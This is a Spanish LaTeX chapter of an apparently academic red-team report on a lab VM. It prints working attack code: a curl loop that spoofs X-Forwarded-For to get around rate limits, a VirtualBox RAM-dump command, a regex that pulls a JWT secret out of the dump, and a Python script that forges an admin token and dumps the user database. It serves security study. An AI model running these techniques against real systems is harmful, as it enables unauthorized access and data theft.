\chapter[Fase 2: Pentesting Ofensivo]{Fase 2: Pentesting Ofensivo (Red Team)}
\label{chap:fase_2_pentesting_ofensivo}

Bajo un modelo estricto de \textit{Caja Negra} perimetral y adoptando un enfoque \textit{Assume Breach} mixto, se inició una evaluación ofensiva estructurada en múltiples fases contra el objetivo alojado en la dirección \texttt{192.168.56.137}. Las tácticas y documentaciones trazadas siguieron el marco de ejecución \textbf{PTES} (Penetration Testing Execution Standard) y mapearon de manera directa con la matriz \textbf{MITRE ATT\&CK}.

\section[Reconocimiento de Red y Activos]{Reconocimiento de la red ciega y descubrimiento de activos}
\label{sec:reconocimiento_red}

\subsection{Metodología de Ejecución y Herramientas Agénticas}
A nivel logístico y operativo, la ejecución de la ofensiva se basó en un enfoque automatizado y orquestado.

Se aprovisionó una máquina virtual con \textbf{Kali Linux} dentro de la topología local, sirviendo como entorno principal de evaluación. En lugar de interactuar intrínsecamente y de forma lineal con la terminal del sistema, se configuró y expuso todo su ecosistema paramétrico de herramientas (\texttt{nmap}, \texttt{sqlmap}, \texttt{curl}, \texttt{hydra}, utilidades \textit{Python}) a través de un servidor \textbf{Model Context Protocol (MCP)}. 

Esta arquitectura avanzada facultó a un agente nativo de Inteligencia Artificial (\textit{Operador Antigravity} integrado en el entorno de escritorio vía VSCode) para invocar dinámicamente y analizar iterativamente \textit{in-vivo} los \textit{outputs} del ecosistema Kali. La fusión del vasto arsenal local con las capacidades heurísticas del modelo AI optimizó los tiempos de reconocimiento y mapeo táctico, identificando rápidamente mitigaciones frente a restricciones como las respuestas \texttt{HTTP 429} o interpretando patrones criptográficos tras los volcados de RAM.

\subsection{Fase de Reconocimiento de Red y Superficie}
El reconocimiento a nivel de capa de enlace evadió la restricción de ICMP impuesta en el segmento de red. Dado que las peticiones \textit{Echo Request} eran descartadas (100\% de pérdida de paquetes), se recurrió a técnicas de barrido ARP en un entorno donde no se alertaría a los contadores estadísticos de un firewall tradicional. 

La ejecución identificó la dirección MAC del objetivo asociado a Oracle VirtualBox:
\begin{lstlisting}
arp-scan -I eth1 --localnet
\end{lstlisting}
Esto confirmó la dirección IP objetivo (\textbf{T1046 - Network Service Discovery}).

\begin{itemize}
    \item \textbf{Censo de Puertos (T1595.002)}: Un escaneo completo (\texttt{nmap -sS -sV -p- -T4}) mostró que casi todos los puertos estaban filtrados, excepto los puertos HTTP/S: \textbf{TCP 80} y \textbf{TCP 443}.
    \item \textbf{Fingerprinting Tecnológico}: Con \texttt{curl -I -k} hacia \newline\texttt{https://192.168.56.137}, se identificó una SPA en \textit{React} (\textit{Vite}) y un backend en \textit{IIS 10.0} (\textit{ASP.NET Core}) al analizar la ruta \newline\texttt{/assets/index-[...].js} y scripts con \texttt{type="module"}.
\end{itemize}

\textbf{Output del escaneo de Nmap:}
\begin{lstlisting}
Discovered open port 443/tcp on 192.168.56.137
Discovered open port 80/tcp on 192.168.56.137
...
PORT    STATE SERVICE    VERSION
80/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
443/tcp open  ssl/https?
MAC Address: 08:00:27:4E:39:58 (Oracle VirtualBox virtual NIC)
\end{lstlisting}

\section[Vectores de Ataque Ejecutados]{Vectores de ataque ejecutados}
\label{sec:vectores_ataque}

\subsection[Ataques Lógicos (Web, SQLi, JWT)]{Ataques lógicos (explotación web, SQLi, XSS, RCE, etc.)}
\label{subsec:ataques_logicos}

\subsubsection{Inspección Ciega y Evasión del Estrangulamiento de Peticiones}
Las rondas estandarizadas de penetración mediante herramientas ciegas (\texttt{Nikto}, \texttt{ffuf}, \texttt{gobuster}) activaron los mecanismos de limitación de tasa (rate limiting) del \textit{endpoint}, devolviendo códigos \texttt{429 Too Many Requests}. Del mismo modo fracasó el utilitario de inyección en IIS 8.3 de Metasploit.

Empleando inyecciones estocásticas y aleatorias a través de diccionarios contra el \textit{endpoint} \texttt{/backend/api/auth/login}, dicha limitación generaba falsos positivos en herramientas como \texttt{Hydra}. Para contrarrestar esto, se alteró dinámicamente la procedencia inferida (\texttt{X-Forwarded-For}) manipulando transaccionalmente el origen. Se logró eludir el control de tasa perimetral, sin éxito a largo plazo debido a la robustez de la contraseña:
\begin{lstlisting}
for i in {1..7}; do 
  curl -s -k -X POST https://192.168.56.137/backend/api/auth/login \
       -H "Content-Type: application/json" -H "X-Forwarded-For: 1.2.3.$i" \
       -d '{"username":"admin","password":"wrongpassword"}'
done
\end{lstlisting}

\subsubsection{Intersección, Autorización y Vectores Cliente-Servidor}
\begin{itemize}
    \item \textbf{Inyección Database (T1190)}: Al ejecutar \texttt{sqlmap} utilizando tokens no autorizados sobre rutas de paginación REST como \texttt{/backend/}\allowbreak\texttt{api/}\allowbreak\texttt{users/1}, no se detectaron vulnerabilidades. La sintaxis del enrutador estaba fuertemente orientada en parámetros fuertemente tipados contra \textit{LINQ} sobre \textit{Entity Framework Core}, inhabilitando un \textit{Time-Based Blind}.
    \item \textbf{Mass Assignment}: Abusando un token válido (Client), se enviaron peticiones \texttt{PUT} con el objetivo de alterar el nivel de privilegios: \newline \texttt{...} \texttt{-d} \texttt{'\{"username":}\allowbreak\texttt{"eminem",} \texttt{"role":}\allowbreak\texttt{"Admin"\}'}. El servidor ignoró el rol superior, erradicando una alteración vertical (\textbf{T1078.004}).

\begin{lstlisting}
curl -sk -X PUT https://192.168.56.137/backend/api/users/2 \
     -H "Authorization: Bearer [EMINEM_TOKEN]" \
     -H "Content-Type: application/json" \
     -d '{"username":"eminem", "email":"eminem@udc.es", "role":"Admin"}'
\end{lstlisting}
    \item \textbf{Módulos de Cliente (XSS/CSRF)}: Tras intentar cruces de origen (\textit{CORS}) con cabeceras \texttt{OPTIONS} forjadas, así como inyecciones de script (\texttt{<script>} \texttt{alert(1)} \texttt{</script>}), el cortafuegos del servidor web (\texttt{HTTP.sys}) bloqueó las peticiones (HTTP 400). Por otra parte, la delegación completa al paradigma \textit{Bearer Token} en \textit{localStorage} eximió de vulnerabilidades \textit{CSRF} al suprimir los modelos contextuales automáticos.
\end{itemize}

\subsubsection{Desbroce de Criptografía JWT e Ingeniería Forjada}
Ante el volumen del sistema de archivos, el análisis se automatizó mediante instrumentación programática con scripts en Python (\texttt{extract\_keys.py}) que escanearon el contexto buscando cadenas asimétricas Base64 próximas a marcadores de declaración (\texttt{"Secret}\allowbreak\texttt{Key"} en \textit{UTF-16LE}):
\begin{lstlisting}
b64_pattern = re.compile(rb'[a-zA-Z0-9+/]{43}=')
# Hallazgo derivado tras barrido chunk-overlap de 50MB:
# [!] CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg=
\end{lstlisting}

Tras la identificación de la clave del algoritmo \textit{HMAC-SHA256}, se generaron localmente \textit{JWT Tokens} forjados (\texttt{forge\_jwt.py}), inyectando el valor \texttt{"role": "Admin"} (\textbf{T1550.001}). Tras confirmar validación (\texttt{HTTP 200 OK}), se logró evadir los controles de acceso de la API.

\subsection[Ataques Físicos e Infraestructura]{Ataques físicos y explotación de infraestructura subyacente}
\label{subsec:ataques_fisicos}
Ante la efectividad de los controles lógicos aplicados a la aplicación web, la evaluación pivotó hacia la explotación de la capa de hipervisor (escenario de amenaza equivalente a un \textit{Evil Maid Attack}).

Utilizando controles sobre la interfaz de mando de Oracle VirtualBox, se ejecutó un \textbf{volcado de la memoria RAM de la máquina virtual} (\textbf{T1003.001 - OS Credential Dumping}), sin alarmar ningún \textit{trigger} de apagado del SO subyacente.
\begin{lstlisting}
& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" debugvm \
  "CSAI" dumpvmcore --filename=c:\temp\csai_mem_new.elf
\end{lstlisting}
Dicho proceso generó un archivo en formato \texttt{.elf} masivo de casi 4.5~GB de la capa huésped hacia el sistema origen. Este vector de ataque elude la protección ofrecida por el cifrado de volumen de \textbf{BitLocker} y el componente \textbf{vTPM 2.0}, puesto que las claves criptográficas residen en texto claro en la memoria volátil durante la ejecución del sistema.

Cabe destacar que se diseñaron y ejecutaron de manera exhaustiva diversas técnicas para intentar extraer las claves criptográficas y para inyectar código directamente en caliente sobre la memoria RAM de la máquina virtual (como depuración nativa con GDB RSP, WinDbg kernel y parcheo en caliente en el host). Dado que todos estos intentos resultaron finalmente fallidos y no produjeron un compromiso funcional o descifrado del volumen, el detalle técnico y la descripción pormenorizada de estas metodologías de análisis de memoria se han incluido por separado en el \ref{chap:anexo_analisis_memoria}.


\section[Compromiso del Sistema y Flag]{Compromiso del sistema y obtención de la Flag (shell SYSTEM o exfiltración de BD)}
\label{sec:compromiso_sistema}
Una vez comprometido el sistema, se cumplieron los siguientes objetivos de evaluación que vulneraban de forma crítica el SLA del entorno:
\begin{itemize}
    \item \textbf{Sobrescritura Visual Inyectada (UI Domain Hijacking)}: Se suplantó una sesión válida manipulando los valores del almacenamiento local: \newline \texttt{localStorage.setItem('authToken', ...)} del navegador para acceder a la interfaz administrativa de la aplicación (SPA) adquiriendo los privilegios del perfil "Administrator" (\texttt{ice\_tea}).

\begin{lstlisting}
localStorage.setItem('authToken', '[FORGED_JWT]');
localStorage.setItem('user', JSON.stringify({
    id: 1, 
    username: 'ice_tea', 
    role: 'Admin', 
    fullName: 'Administrator', 
    email: 'icecube@securewebapp.local'
}));
\end{lstlisting}

    \item \textbf{Data Breach Masivo por Descarga (\texttt{dump\_db.py})}: Mediante la automatización de peticiones HTTP (\textit{script} programado bajo Python) empleando cabeceras de autorización forjadas, se procedió a extraer el volcado completo de la base de datos de usuarios de la API sin generar alertas evidentes en el agente \texttt{Sysmon}. Esta acción supuso una vulneración total de la confidencialidad de los datos albergados en el sistema objetivo.

\begin{lstlisting}
# Script de exfiltración final (Python)
import jwt, requests, urllib3, json

payload = {"sub": "1", "name": "admin", "role": "Admin", 
           "iss": "SecureWebApp", "aud": "SecureWebAppClient", "exp": 1775327944}
token = jwt.encode(payload, "CWgLnSB5JKpgba6BWyzwV8Uf+qDpErvjMPfpv9vIifg=", algorithm="HS256")
headers = {"Authorization": f"Bearer {token}"}

response = requests.get("https://192.168.56.137/backend/api/users", headers=headers, verify=False)
with open("exfiltrated_data.json", "w") as f:
    json.dump(response.json(), f, indent=2)
\end{lstlisting}
\end{itemize}
